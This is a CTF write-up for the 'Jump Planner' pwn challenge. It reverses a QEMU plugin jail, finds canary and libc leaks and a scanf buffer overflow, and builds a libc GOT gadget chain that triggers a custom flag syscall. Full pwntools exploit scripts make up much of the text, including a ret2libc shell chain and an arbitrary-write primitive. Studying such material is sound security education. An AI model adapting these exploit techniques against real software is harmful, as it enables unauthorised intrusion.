---
layout: post
author: playoff-rondo
title:  "Battelle Shmoocon CTF Jump Planner (libC GOT chaining)"
date:   2024-01-15 12:34:37 -0500
categories: PWN
tags: playoff-rondo
---

Author Write Up

Category: PWN
Difficulty: Hard
Description: `we found an old time jump tool but were aware of the many vulns in it do we decided to app a jail around it to mitigate all the problems`

Handout:
[Source](https://github.com/thisusernameistaken/my_chals/tree/master/jump_planner_release)



# Understanding The Challenge

There are several files that are given in the handout such as the `Dockerfile` and `docker-compose.yml` which are used to locally host the challenge for testing.

There is also a `qemu_x86_64` binary along with a `run` and `libjail.so`. These files show that to interact with the main binary `jump_planner`, you have to pass it through `qemu_x86_64` with the `libjail.so` as a plugin. 

The challenge is not to break `qemu_x86_64` as stated by the description that the jump tool is vuln, the `libjail.so` however will be worth to reverse to understand what "mitigations" we added ontop of the main executable.

## libjail.so

This is a qemu plugin which interacts with the binary qemu is emulating.

The code below installs two handlers, one for every time qemu translates instructions and one that handles when a syscall instruction is executed.

There's also a global variable called `return_counter` being initialized.

```c
0000167e  int64_t qemu_plugin_install(int64_t arg1)
0000168e      int64_t rsi
0000168e      int64_t var_18 = rsi
00001692      int32_t rdx
00001692      int32_t var_1c = rdx
00001695      int64_t rcx
00001695      int64_t var_28 = rcx
000016a0      *return_counter = 0
000016b5      qemu_plugin_register_vcpu_tb_trans_cb(arg1, vcpu_tb_trans)
000016c8      qemu_plugin_register_vcpu_syscall_cb(arg1, vcpu_syscall)
000016d3      return 0
```

### Translation hook

The following code essentially checks each instruction's disassembly text and sets up a handler for either the `call` or `ret` instructions
```c
00001484  int64_t vcpu_tb_trans(int64_t arg1, int64_t arg2)
00001490      int64_t var_40 = arg1
0000149f      int64_t rax_1 = qemu_plugin_tb_n_insns(arg2)
00001577      int64_t i
00001577      for (i = 0; i u< rax_1; i = i + 1) {
000014c3          int64_t rax_3 = qemu_plugin_tb_get_insn(arg2, i)
000014d3          char* rax_5 = qemu_plugin_insn_disas(rax_3)
000014e8          int64_t var_10_1 = qemu_plugin_insn_vaddr(rax_3)
00001506          if (strncmp(rax_5, "call", 4) == 0) {
00001526              qemu_plugin_register_vcpu_mem_cb(rax_3, vcpu_mem_call, 0, 3, 0)
0000150c          }
00001545          if (strncmp(rax_5, "ret", 3) == 0) {
00001565              qemu_plugin_register_vcpu_mem_cb(rax_3, vcpu_mem_ret, 0, 3, 0)
0000154b          }
00001543      }
00001580      return i

```

These two functions keep track of the memory that is modified by the instruction. For both `call` and `ret` the memory modified when executed is the top of the stack, either pushing or popping the saved return address.
This will track all `call`s and `ret`s to make sure they match up, meaning if you try to overwrite the return address of a function it will be expecting whatever address was saved by the call and they wont match which will trigger a message saying "NO ROPPING" and then exit.

```c
00001379  int64_t vcpu_mem_call(int32_t arg1, int32_t arg2, int64_t* arg3)
00001385      int32_t var_1c = arg1
0000138f      int64_t rcx
0000138f      int64_t var_30 = rcx
0000139a      g_rw_lock_writer_lock(&expand_array_lock)
000013ab      if (qemu_plugin_mem_is_store(zx.q(arg2)) != 0) {
000013cd          return_array[*return_counter] = *arg3
000013e6          *return_counter = *return_counter + 1
000013db      }
000013f7      return g_rw_lock_writer_unlock(&expand_array_lock)


000013f8  int64_t vcpu_mem_ret(int32_t arg1, int32_t arg2, int64_t* arg3)
00001404      int32_t var_1c = arg1
00001407      int32_t var_20 = arg2
0000140e      int64_t rcx
0000140e      int64_t var_30 = rcx
00001419      g_rw_lock_writer_lock(&expand_array_lock)
0000143b      *return_counter = *return_counter - 1
0000145d      if (return_array[*return_counter] == *arg3) {
00001483          return g_rw_lock_writer_unlock(&expand_array_lock)
00001475      }
00001466      puts(str: "NO ROPPING!")
00001470      exit(status: 0)
00001470      noreturn

```


### Syscall Hook

The syscall hook attempts to stop any time you try to execute the `execve` syscall so there is no easy jump to one_gadget or system. There is an added syscall that when called with the correct arguments the flag will be printed and the program exits. The goal of the challenge is obvious that we need to call syscall `0x5add011` correctly to grab the flag.
```c
000015f1  void vcpu_syscall(int64_t arg1, int32_t arg2, int32_t arg3, char* arg4, int64_t arg5)
000015fd      int64_t var_10 = arg1
00001601      int32_t var_14 = arg2
00001613      if (arg3 == 0x3b) {
0000161c          puts(str: "NO EXEC!")
00001626          exit(status: 0)
00001626          noreturn
00001626      }
00001632      if (arg3 == 0x5add011 && strcmp(arg4, "please_give_me_flag").d == 0 && arg5 == 0x6942069420) {
00001662          puts(str: "Backdoor Unlocked!")
0000166c          give_flag()
00001676          exit(status: 1)
00001676          noreturn
00001676      }
```

# Finding the Vulns

The main menu of the binary is below. The main actions are:
- add
- remove year
- quick jump
- manual jump
- list

```c
00001875  int32_t main(int32_t argc, char** argv, char** envp)
0000188a      void* fsbase
0000188a      int64_t var_10 = *(fsbase + 0x28)
00001890      int32_t var_3c = 0x7e7
000018a8      void var_38
000018a8      memset(&var_38, 0, 0x28)
000018b4      setup(&var_38)
000018c3      puts(str: "Time Jump Planner v1.2")
000018d5      while (true) {
000018de          switch (sx.d(menu(var_3c))) {
000018fe              case 0
000018fe                  continue
00001908              case 1
00001908                  add(&var_38)
0000190d                  continue
00001916              case 2
00001916                  remove_year(&var_38)
0000191b                  continue
0000192b              case 3
0000192b                  quick_jump(&var_38, &var_3c)
00001930                  continue
00001939              case 4
00001939                  manual_jump(&var_3c)
0000193e                  continue
00001947              case 5
00001947                  list(&var_38)
0000194c                  continue
000018fe              case 6
000018fe                  break
000018fe          }
000018fe      }
00001958      puts(str: "Good Bye")
00001962      exit(status: 0)
00001962      noreturn
```

## Type Mismatching

`var_38` is an `int32_t[10]` however every function that takes the list in as an argument uses it as in `int64_t[10]`
This means that there is an out-of-bounds vulnerability when interacting with this list.

The list function shows that although its indexing as an `int64_t[]` but printing the `Year` as `uint32_t`, so this can leak the low 32bits of data on the stack. Interacting with it you can see the canary and libc leak just not the entirety of it. 

```c
000017d8  int64_t list(void* arg1)
000017f2      int64_t rax = puts(str: "Quick Jump List:")
0000186f      for (int32_t i = 0; i s<= 9; i = i + 1) {
0000181a          if (*(arg1 + (sx.q(i) << 3)) != 0) {
00001862              rax = printf(format: "\t%d) Year: %u\n", zx.q(i), *(arg1 + (sx.q(i) << 3)))
0000183c          } else {
00001830              rax = printf(format: "\t%d) Not Assigned\n", zx.q(i))
0000181f          }
0000181f      }
00001874      return rax
```

The quick jump function however does print the element with `%lu` so it can be used to get full leaks of the canary and libc/

```c
000015ae  int64_t quick_jump(void* arg1, int32_t* arg2)
000015c2      void* fsbase
000015c2      int64_t rax = *(fsbase + 0x28)
000015db      puts(str: "Quick Jump:")
000015ef      printf(format: "Index: ")
0000160a      int32_t var_14
0000160a      __isoc99_scanf(format: "%d%*c", &var_14)
0000161c      if (var_14 s<= 0xa && var_14 s>= 0) {
00001660          printf(format: "Jumping to Year %lu at current location\n", *(arg1 + (sx.q(var_14) << 3)))
00001682          *arg2 = (*(arg1 + (sx.q(var_14) << 3))).d
00001692          if (rax == *(fsbase + 0x28)) {
0000169a              return rax - *(fsbase + 0x28)
00001689          }
00001694          __stack_chk_fail()
00001694          noreturn
00001694      }
00001628      puts(str: "Invalid Index!")
00001632      exit(status: 0)
00001632      noreturn
```

## Buffer Overflow Bug

The manual jump function is interesting with a lot of weirdness going on.

```c
0000169b  int64_t manual_jump(int32_t* arg1)
000016ab      void* fsbase
000016ab      int64_t rax = *(fsbase + 0x28)
000016ba      int32_t var_48 = 1
000016cb      puts(str: "Manual Jump Mode:")
000016df      printf(format: "Enter Year: ")
000016fa      int32_t var_4c
000016fa      __isoc99_scanf(format: "%d%*c", &var_4c)
00001709      puts(str: "Describe location:")
0000171d      printf(format: "\tEnter number of characters of location (max 30): ")
00001738      __isoc99_scanf(format: "%d%*c", &var_48)
00001743      if (var_48 s> 0x1e) {
00001745          var_48 = 0x1e
00001745      }
00001765      void var_42
00001765      sprintf(s: &var_42, format: "%%%ds", zx.q(var_48), "%%%ds")
00001779      printf(format: "\tEnter location: ")
00001791      void var_38
00001791      __isoc99_scanf(format: &var_42, &var_38, &var_38)
000017ae      printf(format: "Jumping to Year %u at %s\n", zx.q(var_4c), &var_38)
000017ba      *arg1 = var_4c
000017bc      getchar()
000017cf      if (rax == *(fsbase + 0x28)) {
000017d7          return rax - *(fsbase + 0x28)
000017c6      }
000017d1      __stack_chk_fail()
000017d1      noreturn
```

It reads in an `int32_t` for the `year` and an `int32_t` as the number of characters to describe the location you are jumping to. Then builds a format string that is passed into scanf to read in the location description.
So in normal use, a user would a number like `5` and the program will build the string `%5s` which gets used in the scanf which will only allow you to read 5 characters. The vuln here is you can enter `0` as the number of characters and the string `%0s` will be unbounded so there is a buffer overflow here.

# Exploitation

For exploit dev purposes, its easier to test outside of qemu first.

## Leaks

Use the quick jump to get canary and libc leak:

```python
from pwn import *
context.binary = elf = ELF("./jump_planner")
libc = ELF("./libc.so.6")
  
io = elf.process()
  
# Leak Canary
io.sendlineafter(b">> ",b"3")
io.sendlineafter(b": ",b"5")
io.readuntil(b"to Year ")
canary = int(io.readuntil(b" ",drop=True))
print(hex(canary))
# Leak Libc
io.sendlineafter(b">> ",b"3")
io.sendlineafter(b": ",b"7")
  
io.readuntil(b"to Year ")
libc_leak = int(io.readuntil(b" ",drop=True))
print(hex(libc_leak))
libc.address = libc_leak -0x29d90
print(hex(libc.address))
  
io.interactive()
```

And the result is:
```c
[+] Starting local process '/home/chris/ctfs/battelle/pwn/jump_planner': pid 707613
0x713095fa0ebb800
0x7f0040e3bd90
0x7f0040e12000
[*] Switching to interactive mode
at current location
Current Year: 1088667024
Options:
    1) Add to speed dial
    2) Remove from speed dial
    3) Quick Jump
    4) Manual Jump
    5) List Speed Dial
    6) Exit
>> $  
```

## Buffer Overflow

We can try to abuse the buffer overflow in the manual jump with our leaks to preform a ret2libc. Filling the stack then overwriting the canary with the canary then I needed to skip over one address on the stack with a pop because in the function, the `year` gets written onto the stack below the saved return address (because its a stack var from parent function). When i set the year to `0`  the high half of one of my gadgets is nulled out.

```python
pop_rdi = libc.address+0x000000000002a3e5
io.sendlineafter(b">> ",b"4")
io.sendlineafter(b": ",b"0")
io.sendlineafter(b": ",b"0")
p = b"A"*0x28 # fill stack
p += p64(canary) # keep canary intact
p += b"B"*8 # rbp
p += p64(pop_rdi+1) # extra ret
p += (p64(pop_rdi) +p64(next(libc.search(b"/bin/sh"))))*4
p += p64(libc.symbols['system'])
 
io.sendlineafter(b": ",p)

io.interactive()
```

## Shell!?

Running the previous code does ROP to system however this is because we are testing without the jail.
```c
[+] Starting local process '/home/chris/ctfs/battelle/pwn/jump_planner': pid 708516
0x3541763f37ef8400
0x7f656e1f0d90
0x7f656e1c7000
[*] Switching to interactive mode
Jumping to Year 0 at AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ whoami
chris
$  
```

With the jail enabled we get:
```c
[+] Starting local process './run': pid 708704
0xb8e6f36b565ccf00
0x7f9cbe88ed90
0x7f9cbe865000
[*] Switching to interactive mode
Jumping to Year 0 at AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
NO ROPPING!
[*] Got EOF while reading in interactive
$  
```

## Libc GOT chaining

A powerful technique exploiters use its controlling a GOT entry of libc, this is because the libc is typically compiled as `Partial RelRo` and the GOT its `read/writable`.

Because we can not use the `execve` syscall, we can't just overwrite one entry with a `one_gadget` or even the `system` symbol. By overwriting multiple `libc got entries` we can chain them together with `COP/JOP gadgets`.

The first step is to overwrite a `GOT` entry.

### Arbitrary Write

Since we can not overwrite the return address without triggering the qemu jail, the attack must target something else. We can overwrite the `base pointer` with the overflow, so when the manual jump function returns the `base pointer` is under our control. 

In the main function loop, when the manual jump function is selected, the argument passed into manual jump is loaded relative to `rbp` which is the basepointer we control. 

```c
00001932  488d45cc           lea     rax, [rbp-0x34 {var_3c}]
00001936  4889c7             mov     rdi, rax {var_3c}
00001939  e85dfdffff         call    manual_jump
```

And as mentioned earlier, in the manual jump function the `Year` (which is the arg1) is set to the year entered (which is an `int32_t`) we control.

By setting the basepointer to be our target address PLUS 0x34, when manual jump is called `arg1` will be the target address and whatever we enter as the year gets written to that address, however the write is only a 32bit write so we can only control the lower half of the GOT entry. This shouldn't affect our solution though because the high half of the pointer is already mapped in libc.

So in the end, for the arb write to work, we have to first call `manual_jump` and abuse the buffer overflow to overwrite `rbp` to `target address+0x34` then call `manual_jump` again this time setting the year to what we want to write to the target address.

The following code writes `0x41414141` to `libc GOT strlen`. Because the means of input is a scanf and I am sending with a newline i chop off the most significant null byte so that the newline character does not corrupted the return address.

```python
gdb.attach(io)
strlen_got = libc.address+0x219098
print("target:",hex(strlen_got))
# set rbp to target
io.sendlineafter(b">> ",b"4")
io.sendlineafter(b": ",b"0")
io.sendlineafter(b": ",b"0")
p = b"A"*0x28
p += p64(canary)
p += p64(strlen_got+0x34)[:-1] #overwrite rbp sp that rbp-0x34 is target of write
io.sendlineafter(b": ",p)
  
value = 0x41414141
# set value to write to target
io.sendlineafter(b">> ",b"4")
io.sendlineafter(b": ",str(value).encode())
io.sendlineafter(b": ",b"0")
io.sendlineafter(b": ",b"hi")
  
io.interactive()
```

The result of this shows that not only did we overwrite the `strlen` GOT entry but also `strlen`  gets called later one and we have instruction pointer control.

![pic1](/assets/jump_planner/pic1.png)


## The Actual Chain

So we know that `strlen` gets called which we can use to start the chain, but we have to write all our gadgets out first before launching the chain otherwise when `strlen` is executed the next gadget isnt setup and will just crash.

Working backwards though we can see what gadgets we need to reach the end state of calling the magic syscall with the correct parameters from the jail.

Also because we will be calling `manual_jump` a lot for each write the following helper code is used:

```python
def do_write(value,target):
	# sets up one write, calls next time called
	io.sendlineafter(b">> ",b"4")
	io.sendlineafter(b": ",str(value).encode())
	io.sendlineafter(b": ",b"0")
	p = b"A"*0x28
	p += p64(canary)
	p += p64(target)[:-1] #overwrite rbp sp that rbp-0x34 is target of write
  
	io.sendlineafter(b": ",p)
```

### Finding the Gadgets

This is where the creativity comes in play as theres probably a ton of ways to chain these gadgets together as there are quiet a lot. I wrote a tool that acts like `ROPgadget` but specifically for these `libc got gadgets`. [https://github.com/thisusernameistaken/LibcGOTchain](https://github.com/thisusernameistaken/LibcGOTchain)

Generating a list of gadgets and then just searching the file for the behavior I want was easy with the binja script. For example, I was looking for a gadget that would set `rdi` to a stack pointer that was close to my current frame, so i searched `lea  rdi, [rsp+` and here are some of the results. (I indented the one I chose to use.)

```c
0xe24a6: mov  rdx, r13; mov  rdi, r15; call jump_memcpy; 
0xe290d: mov  rdx, r13; mov  rdi, r15; call jump_memcpy; 
0x16f9ee: mov  rsi, r11; mov  qword [rsp+0x18], rcx; mov  dword [rsp+0x10], r10d; call jump_memcpy; 
	*0xec84e: lea  rdi, [rsp+0xf]; mov  rdx, r8; mov  rsi, r12; and  rdi, 0xfffffffffffffff0; call jump_memcpy;*
0xee373: mov  rsi, r15; mov  rdi, r14; call jump_mempcpy; mov  rdx, qword [rbp-0x2e8]; mov  rsi, r13; mov  byte [rax], 0x2f; lea  rdi, [rax+0x1]; call jump_memcpy; 
0xedbb6: mov  rsi, qword [rsp+0x10]; mov  rdx, rbp; mov  rdi, rax; call jump_mempcpy; mov  rdx, r12; mov  rsi, r13; mov  byte [rax], 0x2f; lea  rdi, [rax+0x1]; call jump_memcpy; 
0x1050a9: mov  rsi, qword [r12+0x8]; mov  rdx, r13; mov  rdi, rax; lea  r12, [rsp+0x60]; call jump_memcpy; 
```

The chain I went with is the following:

#### lea_rdi_rsp

```python
lea_rdi_rsp = libc.address+0xec84e
'''
000ec84e 488d7c240f lea rdi, [rsp+0xf]
000ec853 4c89c2 mov rdx, r8
000ec856 4c89e6 mov rsi, r12
000ec859 4883e7f0 and rdi, 0xfffffffffffffff0
000ec85d e8bebdf3ff call jump_memcpy
'''
```

The first gadget of the chain which gets called from `strlen` will set `rdi` to a stack pointer that is above the "saved return address" to make sure and not corrupt that and trigger the jail.

#### double_call_gets

```python
double_call_gets = libc.address+0x1187f2
'''
001187f2 e839fcf0ff call jump_memmove
001187f7 be2f000000 mov esi, 0x2f
001187fc 4c89ef mov rdi, r13
001187ff e8ecfdf0ff call jump_strrchr
'''
```

This is a special gadget because it has 2 calls to `libc GOT entries`.
This is important because one way to bypass the jail call/ret protection is by calling a function and having it return cleanly.
So with this gadget, we can overwrite the `memmove` GOT entry to anything we want and that will return back into this gadget where whatever gadget at `strrchr` is will continue the chain.

With `rdi` being on the stack, I make `memmove` call `gets` this way I have much better control of the stack moving forward.

#### mov_rax_rsp_40

```python
mov_rax_rsp_40 = libc.address+0x1597c8
'''
001597c8 488b442440 mov rax, qword [rsp+0x40 {var_68}]
001597cd 4c89e7 mov rdi, r12
001597d0 4889c6 mov rsi, rax
001597d3 4889442410 mov qword [rsp+0x10 {var_98_1}], rax
001597d8 e8a3edecff call jump_strcasecmp
'''
```

Now that I can control as much of the stack as I want, there are more options of gadgets I can use to control other registers.
The goal again is to call the magic syscall and to do that I need control of `rax` to set as the syscall number. I can easily set the desired value when gets is called and this gadget will load it in `rax` for me.

#### add_rsp_a_lot

```python
add_rsp_a_lot = libc.address+0xd059b
'''
000d059b 4881c4f8000000 add rsp, 0xf8
000d05a2 5b pop rbx {__saved_rbx}
000d05a3 5d pop rbp {__saved_rbp}
000d05a4 415c pop r12 {__saved_r12}
000d05a6 415d pop r13 {__saved_r13}
000d05a8 415e pop r14 {__saved_r14}
000d05aa 415f pop r15 {__saved_r15}
000d05ac e90f80f5ff jmp jump_wcscmp
'''
```

This gadget allows me to move the stack passed whatever was on it before and be directly in my fully controlled space from the `gets`.

#### lea_rdi_rsp2

```python
lea_rdi_rsp2 = libc.address+0x15554c #stpcpy
'''
0015554c 488d7c2405 lea rdi, [rsp+0x5]
00155551 4c89ee mov rsi, r13
00155554 c64424045f mov byte [rsp+0x4], 0x5f
00155559 e8f22eedff call jump___stpcpy
'''
```

This is another gadget that loads the address of the stack into `rdi`. This way I can set `rdi` to be the string `please_give_me_flag`.

#### syscall

The final piece of the chain is when `stpcpy` gets called we need to trigger the syscall instruction.
Any address of a syscall will work because we don't plan to continue the chain after.

### The Code

The following code writes the `GOT chain`
```python
writes = [end,
	lea_rdi_rsp, strlen_got,
	double_call_gets,memcpy_got,
	mov_rax_rsp_40, strrchr_got,
	add_rsp_a_lot,strcasecmp_got,
	lea_rdi_rsp2, wcscmp_got,
	syscall,stpcpy_got,
  
	gets,memmove_got,
0]
writes=writes[::-1]
  
i=0
while i < len(writes)-1:
	do_write(writes[i],writes[i+1])
	i+=2
  
p2 = b"C"*0x28
p2 += p64(0x5add011)
p2 += b"D"*(0xe0-(8*4))
p2 += p64(0x6942069420)
p2 += p64(2)
p2 += p64(3)
p2 += b"A"*5
p2 += b"please_give_me_flag\x00"
  
io.sendline(p2)
io.interactive()
```

I wrote the `writes` chain backwards from how we need to write them in the binary only to make it easier for me to follow the chain. Remember its important to write the final piece (`strlen`) last because thats what triggers the chain in the first place. I also added a placeholder `end` in the chain because of how the arbitrary write was explained earlier with it taking 2 calls to `manual_jump` to do the overwrite, so `end` is just an unused `GOT` entry that never gets written to but was placed to get `strlen` written to. 

We could again try to call `execve`, however the jail will stop that.

```c
[+] Opening connection to 127.0.0.1 on port 5000: Done
canary: 0x3b40e18a1bd1d00
libc leak: 0x7fd2987cbd90
libc base: 0x7fd2987a2000
[*] Switching to interactive mode
Jumping to Year 2559109198 at AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Current Year: 2558304624
NO EXEC!
[*] Got EOF while reading in interactive
$  
```

# Solve

## Flag

Running on remote gives us the flag:
```python
[+] Opening connection to 127.0.0.1 on port 5000: Done
canary: 0x479ed93830c90e00
libc leak: 0x7f27b9e71d90
libc base: 0x7f27b9e48000
[*] Switching to interactive mode
Jumping to Year 3119728718 at AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Current Year: 3118924144
Backdoor Unlocked!
battelle{this_is_a_fake_flag}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 5000
```

## Full code

```python
from pwn import *
context.binary = elf = ELF("./jump_planner")
libc = ELF("./libc.so.6")

# io = elf.process()
# io = process("./run")
io = remote("127.0.0.1",5000)

# Leak Canary
io.sendlineafter(b">> ",b"3")
io.sendlineafter(b": ",b"5")
io.readuntil(b"to Year ")
canary = int(io.readuntil(b" ",drop=True))
print("canary:",hex(canary))

# Leak Libc
io.sendlineafter(b">> ",b"3")
io.sendlineafter(b": ",b"7")
io.readuntil(b"to Year ")
libc_leak = int(io.readuntil(b" ",drop=True))
print("libc leak:",hex(libc_leak))
libc.address = libc_leak -0x29d90
print("libc base:",hex(libc.address))


def do_write(value,target):
    # sets up one write, calls next time called
    io.sendlineafter(b">> ",b"4")
    io.sendlineafter(b": ",str(value).encode())
    io.sendlineafter(b": ",b"0")
    p  = b"A"*0x28
    p += p64(canary)
    p += p64(target)[:-1] #overwrite rbp sp that rbp-0x34 is target of write

    io.sendlineafter(b": ",p)

#GOT
strlen_got =  libc.address+0x219098 +0x34 # needed to start cahin
memcpy_got =  libc.address+0x219160 +0x34 # lea rdi,rsp 
stpcpy_got =  libc.address+0x219078 +0x34 # lea rdi,rsp as well
wcscmp_got =  libc.address+0x219130 +0x34 # add rsp, 0x...
strcasecmp_got=libc.address+0x219110+0x34 # mov rax, qword[rsp+0x40]
memmove_got = libc.address+0x219068 +0x34 # double call part one
strrchr_got = libc.address+0x219148 +0x34 # double call part two

#gadgets
syscall = libc.address+0x11ea3b #

lea_rdi_rsp = libc.address+0xec84e 
'''
000ec84e  488d7c240f         lea     rdi, [rsp+0xf]
000ec853  4c89c2             mov     rdx, r8
000ec856  4c89e6             mov     rsi, r12
000ec859  4883e7f0           and     rdi, 0xfffffffffffffff0
000ec85d  e8bebdf3ff         call    jump_memcpy
'''

double_call_gets = libc.address+0x1187f2 
'''
001187f2  e839fcf0ff         call    jump_memmove
001187f7  be2f000000         mov     esi, 0x2f
001187fc  4c89ef             mov     rdi, r13
001187ff  e8ecfdf0ff         call    jump_strrchr
'''

mov_rax_rsp_40 = libc.address+0x1597c8 
'''
001597c8  488b442440         mov     rax, qword [rsp+0x40 {var_68}]
001597cd  4c89e7             mov     rdi, r12
001597d0  4889c6             mov     rsi, rax
001597d3  4889442410         mov     qword [rsp+0x10 {var_98_1}], rax
001597d8  e8a3edecff         call    jump_strcasecmp
'''

add_rsp_a_lot = libc.address+0xd059b 
'''
000d059b  4881c4f8000000     add     rsp, 0xf8
000d05a2  5b                 pop     rbx {__saved_rbx}
000d05a3  5d                 pop     rbp {__saved_rbp}
000d05a4  415c               pop     r12 {__saved_r12}
000d05a6  415d               pop     r13 {__saved_r13}
000d05a8  415e               pop     r14 {__saved_r14}
000d05aa  415f               pop     r15 {__saved_r15}
000d05ac  e90f80f5ff         jmp     jump_wcscmp
'''

lea_rdi_rsp2 = libc.address+0x15554c #stpcpy 
'''
0015554c  488d7c2405         lea     rdi, [rsp+0x5]
00155551  4c89ee             mov     rsi, r13
00155554  c64424045f         mov     byte [rsp+0x4], 0x5f
00155559  e8f22eedff         call    jump___stpcpy
'''

# junk got addr to end the chain
end = libc.address+0x2190c8 +0x34

# setup double call for gets
gets = libc.symbols['gets']

writes = [end,
    lea_rdi_rsp, strlen_got,    
    double_call_gets,memcpy_got,
    mov_rax_rsp_40, strrchr_got,
    add_rsp_a_lot,strcasecmp_got,
    lea_rdi_rsp2, wcscmp_got, 
    syscall,stpcpy_got,

    gets,memmove_got,
    0]
writes=writes[::-1]

i=0
while i < len(writes)-1:
    do_write(writes[i],writes[i+1])
    i+=2

p2 = b"C"*0x28
p2 += p64(0x5add011)
p2 += b"D"*(0xe0-(8*4))
p2 += p64(0x6942069420)
p2 += p64(2)
p2 += p64(3)
p2 += b"A"*5
p2 += b"please_give_me_flag\x00"

io.sendline(p2)
io.interactive()
```